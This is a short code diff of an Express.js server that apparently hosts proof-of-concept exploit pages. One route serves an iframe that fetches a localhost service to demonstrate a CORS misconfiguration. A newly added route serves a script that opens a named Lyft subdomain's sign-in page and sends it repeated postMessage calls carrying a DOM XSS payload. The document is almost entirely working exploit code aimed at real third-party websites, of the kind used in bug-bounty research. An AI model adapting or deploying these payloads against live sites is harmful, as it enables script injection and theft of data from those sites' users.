@@ -19,8 +19,14 @@ app.get("/CORSMisconfigurationCodeWithChrome", function (req, res) {
    res.send(`<iframe src="data:text/html,<script>fetch('http://127.0.0.1:8090').then(a=>a.text()).then(content=>{console.log(content);alert(content)})</script>">`);
 });
 
-  
+app.get("/LyftPostMessageDOMXSS", function (req, res) {
+   res.send(`let wintabxss = open("https://biximontreal.lyft.net/sign-in?next=http%3A%2F%2Fbiximontreal.lyft.net%2Fprofile");
+setInterval(()=>{
+wintabxss.postMessage([{"reportingName":"\"><img src=x onerror=alert(origin)>","eventName":"c7cd1703_97fb_4e7d_9f20_f4f5f49a72d1","advertiserId":"68792028f297354dce5713ef","campaignId":"68792028f297354dce5713ef"}],"*")
+},1000)`);
+});
 
+  
 
 
     
